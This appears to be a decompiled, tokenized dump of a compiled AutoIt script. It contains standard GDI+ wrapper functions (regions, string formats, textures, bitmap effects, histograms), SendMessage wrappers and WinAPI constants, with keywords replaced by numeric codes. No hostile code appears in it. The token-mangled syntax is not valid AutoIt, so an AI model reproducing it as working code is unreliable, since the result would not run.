28$TRECTF=65($TAGGDIPRECTF)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetRegionBounds","handle",$HREGION,"handle",$HGRAPHICS,"struct*",$TRECTF)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$ABOUNDS[4]
13$II=1154
$ABOUNDS[$II-1]=66($TRECTF,$II)
14
34$ABOUNDS
33
32_GDIPLUS_REGIONGETHRGN($HREGION,$HGRAPHICS=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetRegionHRgn","handle",$HREGION,"handle",$HGRAPHICS,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
34$ARESULT[3]
33
32_GDIPLUS_REGIONSETEMPTY($HREGION)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetEmpty","handle",$HREGION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_REGIONSETINFINITE($HREGION)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetInfinite","handle",$HREGION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_REGIONTRANSFORM($HREGION,$HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipTransformRegion","handle",$HREGION,"handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_REGIONTRANSLATE($HREGION,$NDX,$NDY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipTranslateRegion","handle",$HREGION,"float",$NDX,"float",$NDY)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_SHUTDOWN()
4$__G_HGDIPDLL=0534287(-1,-1,40)
$__G_IGDIPREF-=1
4$__G_IGDIPREF=05
58($__G_HGDIPDLL,"none","GdiplusShutdown","ulong_ptr",$__G_IGDIPTOKEN)
63($__G_HGDIPDLL)
$__G_HGDIPDLL=0
8
3439
33
32_GDIPLUS_STARTUP($SGDIPDLL=41,$BRETDLLHANDLE=40)
$__G_IGDIPREF+=1
4$__G_IGDIPREF>153439
4$SGDIPDLL=415$SGDIPDLL="gdiplus.dll"
$__G_HGDIPDLL=64($SGDIPDLL)
4$__G_HGDIPDLL=-15
$__G_IGDIPREF=0
34287(1,2,40)
8
28$SVER=107($SGDIPDLL)
$SVER=331($SVER,".")
4$SVER[1]>55$__G_BGDIP_V1_0=40
28$TINPUT=65($TAGGDIPSTARTUPINPUT)
28$TTOKEN=65("ulong_ptr Data")
69($TINPUT,"Version",1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdiplusStartup","struct*",$TTOKEN,"struct*",$TINPUT,"ptr",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
$__G_IGDIPTOKEN=66($TTOKEN,"Data")
4$BRETDLLHANDLE534$__G_HGDIPDLL
34288($SVER[1],39)
33
32_GDIPLUS_STRINGFORMATCREATE($IFORMAT=0,$ILANGID=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateStringFormat","int",$IFORMAT,"word",$ILANGID,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_STRINGFORMATDISPOSE($HFORMAT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteStringFormat","handle",$HFORMAT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_STRINGFORMATGETMEASURABLECHARACTERRANGECOUNT($HSTRINGFORMAT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetStringFormatMeasurableCharacterRangeCount","handle",$HSTRINGFORMAT,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_STRINGFORMATSETALIGN($HSTRINGFORMAT,$IFLAG)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetStringFormatAlign","handle",$HSTRINGFORMAT,"int",$IFLAG)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_STRINGFORMATSETLINEALIGN($HSTRINGFORMAT,$ISTRINGALIGN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetStringFormatLineAlign","handle",$HSTRINGFORMAT,"int",$ISTRINGALIGN)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_STRINGFORMATSETMEASURABLECHARACTERRANGES($HSTRINGFORMAT,$ARANGES)
28$ICOUNT=$ARANGES[0][0]
28$TCHARACTERRANGES=65("int["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TCHARACTERRANGES,1,$ARANGES[$II][0],(($II-1)*2)+1)
69($TCHARACTERRANGES,1,$ARANGES[$II][1],(($II-1)*2)+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetStringFormatMeasurableCharacterRanges","handle",$HSTRINGFORMAT,"int",$ICOUNT,"struct*",$TCHARACTERRANGES)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_TEXTURECREATE($HIMAGE,$IWRAPMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateTexture","handle",$HIMAGE,"int",$IWRAPMODE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_TEXTURECREATE2($HIMAGE,$NX,$NY,$NWIDTH,$NHEIGHT,$IWRAPMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateTexture2","handle",$HIMAGE,"int",$IWRAPMODE,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[7]
33
32_GDIPLUS_TEXTURECREATEIA($HIMAGE,$NX,$NY,$NWIDTH,$NHEIGHT,$PIMAGEATTRIBUTES=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateTextureIA","handle",$HIMAGE,"handle",$PIMAGEATTRIBUTES,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"ptr*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[7]
33
32__GDIPLUS_BRUSHDEFCREATE(36$HBRUSH)
4$HBRUSH=05
$__G_HGDIPBRUSH=_GDIPLUS_BRUSHCREATESOLID()
$HBRUSH=$__G_HGDIPBRUSH
8
33
32__GDIPLUS_BRUSHDEFDISPOSE($ICURERROR=@ERROR,$ICUREXTENDED=@EXTENDED)
4$__G_HGDIPBRUSH<>05
_GDIPLUS_BRUSHDISPOSE($__G_HGDIPBRUSH)
$__G_HGDIPBRUSH=0
8
34287($ICURERROR,$ICUREXTENDED)
33
32__GDIPLUS_EXTRACTFILEEXT($SFILENAME,$BNODOT=39)
28$IINDEX=__GDIPLUS_LASTDELIMITER(".\:",$SFILENAME)
4($IINDEX>0)1(325($SFILENAME,$IINDEX,1)=".")5
4$BNODOT5
34325($SFILENAME,$IINDEX+1)
6
34325($SFILENAME,$IINDEX)
8
6
34""
8
33
32__GDIPLUS_LASTDELIMITER($SDELIMITERS,$SSTRING)
28$SDELIMITER,$IN
13$II=115323($SDELIMITERS)
$SDELIMITER=325($SDELIMITERS,$II,1)
$IN=311($SSTRING,$SDELIMITER,$STR_NOCASESENSEBASIC,-1)
4$IN>0534$IN
14
33
32__GDIPLUS_PENDEFCREATE(36$HPEN)
4$HPEN=05
$__G_HGDIPPEN=_GDIPLUS_PENCREATE()
$HPEN=$__G_HGDIPPEN
8
33
32__GDIPLUS_PENDEFDISPOSE($ICURERROR=@ERROR,$ICUREXTENDED=@EXTENDED)
4$__G_HGDIPPEN<>05
_GDIPLUS_PENDISPOSE($__G_HGDIPPEN)
$__G_HGDIPPEN=0
8
34287($ICURERROR,$ICUREXTENDED)
33
32_GDIPLUS_BITMAPAPPLYEFFECT($HBITMAP,$HEFFECT,$TRECT=42)
4$__G_BGDIP_V1_0534287(-1,0,40)
43232($HEFFECT)534287(10,0,40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapApplyEffect","handle",$HBITMAP,"handle",$HEFFECT,"struct*",$TRECT,"int",0,"ptr*",0,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BITMAPAPPLYEFFECTEX($HBITMAP,$HEFFECT,$IX=0,$IY=0,$IW=0,$IH=0)
4$__G_BGDIP_V1_0534287(-1,0,40)
28$TRECT=0
419($IX,$IY,$IW,$IH)5
$TRECT=65("int Left; int Top; int Right; int Bottom;")
69($TRECT,"Right",$IW+69($TRECT,"Left",$IX))
69($TRECT,"Bottom",$IH+69($TRECT,"Top",$IY))
8
28$ISTATUS=_GDIPLUS_BITMAPAPPLYEFFECT($HBITMAP,$HEFFECT,$TRECT)
43$ISTATUS534287(@ERROR,@EXTENDED,40)
3439
33
32_GDIPLUS_BITMAPCONVERTFORMAT($HBITMAP,$IPIXELFORMAT,$IDITHERTYPE,$IPALETTETYPE,$TPALETTE,$FALPHATHRESHOLDPERCENT=0)
4$__G_BGDIP_V1_0534287(-1,0,40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapConvertFormat","handle",$HBITMAP,"uint",$IPIXELFORMAT,"uint",$IDITHERTYPE,"uint",$IPALETTETYPE,"struct*",$TPALETTE,"float",$FALPHATHRESHOLDPERCENT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BITMAPCREATEAPPLYEFFECT($HBITMAP,$HEFFECT,$TRECT=42,$TOUTRECT=42)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapCreateApplyEffect","handle*",$HBITMAP,"int",1,"handle",$HEFFECT,"struct*",$TRECT,"struct*",$TOUTRECT,"handle*",0,"int",0,"ptr*",0,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[6]
33
32_GDIPLUS_BITMAPCREATEAPPLYEFFECTEX($HBITMAP,$HEFFECT,$IX=0,$IY=0,$IW=0,$IH=0)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TRECT=0
419($IX,$IY,$IW,$IH)5
$TRECT=65("int Left; int Top; int Right; int Bottom;")
69($TRECT,"Right",$IW+69($TRECT,"Left",$IX))
69($TRECT,"Bottom",$IH+69($TRECT,"Top",$IY))
8
28$HBITMAP_FX=_GDIPLUS_BITMAPCREATEAPPLYEFFECT($HBITMAP,$HEFFECT,$TRECT,42)
34287(@ERROR,@EXTENDED,$HBITMAP_FX)
33
32_GDIPLUS_BITMAPGETHISTOGRAM($HBITMAP,$IHISTOGRAMFORMAT,$IHISTOGRAMSIZE,$TCHANNEL_0,$TCHANNEL_1=0,$TCHANNEL_2=0,$TCHANNEL_3=0)
4$__G_BGDIP_V1_0534287(-1,0,40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapGetHistogram","handle",$HBITMAP,"uint",$IHISTOGRAMFORMAT,"uint",$IHISTOGRAMSIZE,"struct*",$TCHANNEL_0,"struct*",$TCHANNEL_1,"struct*",$TCHANNEL_2,"struct*",$TCHANNEL_3)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_BITMAPGETHISTOGRAMEX($HBITMAP)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$ISIZE=_GDIPLUS_BITMAPGETHISTOGRAMSIZE($GDIP_HISTOGRAMFORMATARGB)
28$THISTOGRAM=65("int Size; uint Red["&$ISIZE&"]; uint MaxRed; uint Green["&$ISIZE&"]; uint MaxGreen; uint Blue["&$ISIZE&"]; uint MaxBlue; uint Alpha["&$ISIZE&"]; uint MaxAlpha; uint Grey["&$ISIZE&"]; uint MaxGrey;")
69($THISTOGRAM,"Size",$ISIZE)
28$ISTATUS=_GDIPLUS_BITMAPGETHISTOGRAM($HBITMAP,$GDIP_HISTOGRAMFORMATARGB,$ISIZE,67($THISTOGRAM,"Alpha"),67($THISTOGRAM,"Red"),67($THISTOGRAM,"Green"),67($THISTOGRAM,"Blue"))
43$ISTATUS534287(@ERROR,@EXTENDED,0)
$ISTATUS=_GDIPLUS_BITMAPGETHISTOGRAM($HBITMAP,$GDIP_HISTOGRAMFORMATGRAY,$ISIZE,67($THISTOGRAM,"Grey"))
43$ISTATUS534287(@ERROR+10,@EXTENDED,0)
28$IMAXRED=0,$IMAXGREEN=0,$IMAXBLUE=0,$IMAXALPHA=0,$IMAXGREY=0
13$I=115$ISIZE
466($THISTOGRAM,"Red",$I)>$IMAXRED5$IMAXRED=66($THISTOGRAM,"Red",$I)
466($THISTOGRAM,"Green",$I)>$IMAXGREEN5$IMAXGREEN=66($THISTOGRAM,"Green",$I)
466($THISTOGRAM,"Blue",$I)>$IMAXBLUE5$IMAXBLUE=66($THISTOGRAM,"Blue",$I)
466($THISTOGRAM,"Alpha",$I)>$IMAXALPHA5$IMAXALPHA=66($THISTOGRAM,"Alpha",$I)
466($THISTOGRAM,"Grey",$I)>$IMAXGREY5$IMAXGREY=66($THISTOGRAM,"Grey",$I)
14
69($THISTOGRAM,"MaxRed",$IMAXRED)
69($THISTOGRAM,"MaxGreen",$IMAXGREEN)
69($THISTOGRAM,"MaxBlue",$IMAXBLUE)
69($THISTOGRAM,"MaxAlpha",$IMAXALPHA)
69($THISTOGRAM,"MaxGrey",$IMAXGREY)
34$THISTOGRAM
33
32_GDIPLUS_BITMAPGETHISTOGRAMSIZE($IFORMAT)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipBitmapGetHistogramSize","uint",$IFORMAT,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_DRAWIMAGEFX($HGRAPHICS,$HIMAGE,$HEFFECT,$TRECTF=0,$HMATRIX=0,$HIMGATTRIBUTES=0,$IUNIT=2)
4$__G_BGDIP_V1_0534287(-1,0,40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDrawImageFX","handle",$HGRAPHICS,"handle",$HIMAGE,"struct*",$TRECTF,"handle",$HMATRIX,"handle",$HEFFECT,"handle",$HIMGATTRIBUTES,"uint",$IUNIT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_DRAWIMAGEFXEX($HGRAPHICS,$HIMAGE,$HEFFECT,$NX=0,$NY=0,$NW=0,$NH=0,$HMATRIX=0,$HIMGATTRIBUTES=0,$IUNIT=2)
4$__G_BGDIP_V1_0534287(-1,0,40)
28$TRECTF=0
419($NX,$NY,$NW,$NH)5$TRECTF=_GDIPLUS_RECTFCREATE($NX,$NY,$NW,$NH)
28$ISTATUS=_GDIPLUS_DRAWIMAGEFX($HGRAPHICS,$HIMAGE,$HEFFECT,$TRECTF,$HMATRIX,$HIMGATTRIBUTES,$IUNIT)
34287(@ERROR,@EXTENDED,$ISTATUS)
33
32_GDIPLUS_EFFECTCREATE($SEFFECTGUID)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TGUID=_WINAPI_GUIDFROMSTRING($SEFFECTGUID)
28$ARESULT=0
4@AUTOITX645
$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateEffect","struct*",$TGUID,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
8
28$TELEM=65("uint64[2];",67($TGUID))
$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateEffect","uint64",66($TELEM,1,1),"uint64",66($TELEM,1,2),"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_EFFECTCREATEBLUR($FRADIUS=10,$BEXPANDEDGE=40)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_BLUR)
69($TEFFECTPARAMETERS,"Radius",$FRADIUS)
69($TEFFECTPARAMETERS,"ExpandEdge",$BEXPANDEDGE)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_BLUREFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATEBRIGHTNESSCONTRAST($IBRIGHTNESSLEVEL=0,$ICONTRASTLEVEL=0)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_BRIGHTNESSCONTRAST)
69($TEFFECTPARAMETERS,"BrightnessLevel",$IBRIGHTNESSLEVEL)
69($TEFFECTPARAMETERS,"ContrastLevel",$ICONTRASTLEVEL)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_BRIGHTNESSCONTRASTEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATECOLORBALANCE($ICYANRED=0,$IMAGENTAGREEN=0,$IYELLOWBLUE=0)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_COLORBALANCE)
69($TEFFECTPARAMETERS,"CyanRed",$ICYANRED)
69($TEFFECTPARAMETERS,"MagentaGreen",$IMAGENTAGREEN)
69($TEFFECTPARAMETERS,"YellowBlue",$IYELLOWBLUE)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_COLORBALANCEEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATECOLORCURVE($IADJUSTMENT,$ICHANNEL,$IADJUSTVALUE)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_COLORCURVE)
69($TEFFECTPARAMETERS,"Adjustment",$IADJUSTMENT)
69($TEFFECTPARAMETERS,"Channel",$ICHANNEL)
69($TEFFECTPARAMETERS,"AdjustValue",$IADJUSTVALUE)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_COLORCURVEEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATECOLORLUT($ACOLORLUT)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_COLORLUT)
13$II=015255
69($TEFFECTPARAMETERS,"LutA",$ACOLORLUT[$II][0],$II+1)
69($TEFFECTPARAMETERS,"LutR",$ACOLORLUT[$II][1],$II+1)
69($TEFFECTPARAMETERS,"LutG",$ACOLORLUT[$II][2],$II+1)
69($TEFFECTPARAMETERS,"LutB",$ACOLORLUT[$II][3],$II+1)
14
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_COLORLUTEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATECOLORMATRIX($TCOLORMATRIX)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_COLORMATRIXEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TCOLORMATRIX)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATEHUESATURATIONLIGHTNESS($IHUELEVEL=0,$ISATURATIONLEVEL=0,$ILIGHTNESSLEVEL=0)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_HUESATURATIONLIGHTNESS)
69($TEFFECTPARAMETERS,"HueLevel",$IHUELEVEL)
69($TEFFECTPARAMETERS,"SaturationLevel",$ISATURATIONLEVEL)
69($TEFFECTPARAMETERS,"LightnessLevel",$ILIGHTNESSLEVEL)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_HUESATURATIONLIGHTNESSEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATELEVELS($IHIGHLIGHT=100,$IMIDTONE=0,$ISHADOW=0)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_LEVELS)
69($TEFFECTPARAMETERS,"Highlight",$IHIGHLIGHT)
69($TEFFECTPARAMETERS,"Midtone",$IMIDTONE)
69($TEFFECTPARAMETERS,"Shadow",$ISHADOW)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_LEVELSEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATEREDEYECORRECTION($AAREAS)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$ICOUNT=$AAREAS[0][0]
28$TAREAS=65("long["&$ICOUNT*4&"]")
13$II=115$ICOUNT
69($TAREAS,1,69($TAREAS,1,$AAREAS[$II][0],(($II-1)*4)+1)+$AAREAS[$II][2],(($II-1)*4)+3)
69($TAREAS,1,69($TAREAS,1,$AAREAS[$II][1],(($II-1)*4)+2)+$AAREAS[$II][3],(($II-1)*4)+4)
14
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_REDEYECORRECTION)
69($TEFFECTPARAMETERS,"NumberOfAreas",$ICOUNT)
69($TEFFECTPARAMETERS,"Areas",67($TAREAS))
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_REDEYECORRECTIONEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS,(68($TAREAS)+68($TEFFECTPARAMETERS))/68($TEFFECTPARAMETERS))
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATESHARPEN($FRADIUS=10,$FAMOUNT=50)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_SHARPEN)
69($TEFFECTPARAMETERS,"Radius",$FRADIUS)
69($TEFFECTPARAMETERS,"Amount",$FAMOUNT)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_SHARPENEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTCREATETINT($IHUE=0,$IAMOUNT=0)
4$__G_BGDIP_V1_0534287(-1,0,0)
28$TEFFECTPARAMETERS=65($TAGGDIP_EFFECTPARAMS_TINT)
69($TEFFECTPARAMETERS,"Hue",$IHUE)
69($TEFFECTPARAMETERS,"Amount",$IAMOUNT)
28$HEFFECT=_GDIPLUS_EFFECTCREATE($GDIP_TINTEFFECTGUID)
4@ERROR534287(@ERROR,@EXTENDED,0)
_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$HEFFECT
33
32_GDIPLUS_EFFECTDISPOSE($HEFFECT)
4$__G_BGDIP_V1_0534287(-1,0,40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteEffect","handle",$HEFFECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_EFFECTGETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS)
4$__G_BGDIP_V1_0534287(-1,0,40)
468($TEFFECTPARAMETERS)<__GDIPLUS_EFFECTGETPARAMETERSIZE($HEFFECT)534287(2,5,40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetEffectParameters","handle",$HEFFECT,"uint*",68($TEFFECTPARAMETERS),"struct*",$TEFFECTPARAMETERS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32__GDIPLUS_EFFECTGETPARAMETERSIZE($HEFFECT)
4$__G_BGDIP_V1_0534287(-1,0,-1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetEffectParameterSize","handle",$HEFFECT,"uint*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_EFFECTSETPARAMETERS($HEFFECT,$TEFFECTPARAMETERS,$ISIZEADJUST=1)
4$__G_BGDIP_V1_0534287(-1,0,40)
28$ISIZE=__GDIPLUS_EFFECTGETPARAMETERSIZE($HEFFECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetEffectParameters","handle",$HEFFECT,"struct*",$TEFFECTPARAMETERS,"uint",$ISIZE*$ISIZEADJUST)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PALETTEINITIALIZE($IENTRIES,$IPALETTETYPE=$GDIP_PALETTETYPEOPTIMAL,$IOPTIMALCOLORS=0,$BUSETRANSPARENTCOLOR=39,$HBITMAP=42)
4$__G_BGDIP_V1_0534287(-1,0,0)
4$IOPTIMALCOLORS>05$IPALETTETYPE=$GDIP_PALETTETYPEOPTIMAL
28$TPALETTE=65("uint Flags; uint Count; uint ARGB["&$IENTRIES&"];")
69($TPALETTE,"Flags",$IPALETTETYPE)
69($TPALETTE,"Count",$IENTRIES)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipInitializePalette","struct*",$TPALETTE,"uint",$IPALETTETYPE,"uint",$IOPTIMALCOLORS,"bool",$BUSETRANSPARENTCOLOR,"handle",$HBITMAP)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$TPALETTE
33
32_SENDMESSAGE($HWND,$IMSG,$WPARAM=0,$LPARAM=0,$IRETURN=0,$WPARAMTYPE="wparam",$LPARAMTYPE="lparam",$SRETURNTYPE="lresult")
28$ARESULT=58("user32.dll",$SRETURNTYPE,"SendMessageW","hwnd",$HWND,"uint",$IMSG,$WPARAMTYPE,$WPARAM,$LPARAMTYPE,$LPARAM)
4@ERROR534287(@ERROR,@EXTENDED,"")
4$IRETURN>=01$IRETURN<=4534$ARESULT[$IRETURN]
34$ARESULT
33
32_SENDMESSAGEA($HWND,$IMSG,$WPARAM=0,$LPARAM=0,$IRETURN=0,$WPARAMTYPE="wparam",$LPARAMTYPE="lparam",$SRETURNTYPE="lresult")
28$ARESULT=58("user32.dll",$SRETURNTYPE,"SendMessageA","hwnd",$HWND,"uint",$IMSG,$WPARAMTYPE,$WPARAM,$LPARAMTYPE,$LPARAM)
4@ERROR534287(@ERROR,@EXTENDED,"")
4$IRETURN>=01$IRETURN<=4534$ARESULT[$IRETURN]
34$ARESULT
33
29$__G_AINPROCESS_WINAPI[64][2]=[[0,0]]
29$__G_AWINLIST_WINAPI[64][2]=[[0,0]]
2930$GW_HWNDFIRST=0
2930$GW_HWNDLAST=1
2930$GW_HWNDNEXT=2
2930$GW_HWNDPREV=3
2930$GW_OWNER=4
2930$GW_CHILD=5
2930$GW_ENABLEDPOPUP=6
2930$GWL_WNDPROC=-4
2930$GWL_HINSTANCE=-6
2930$GWL_HWNDPARENT=-8
2930$GWL_ID=-12
2930$GWL_STYLE=-16
2930$GWL_EXSTYLE=-20
2930$GWL_USERDATA=-21
2930$__WINAPICONSTANT_WM_SETFONT=48
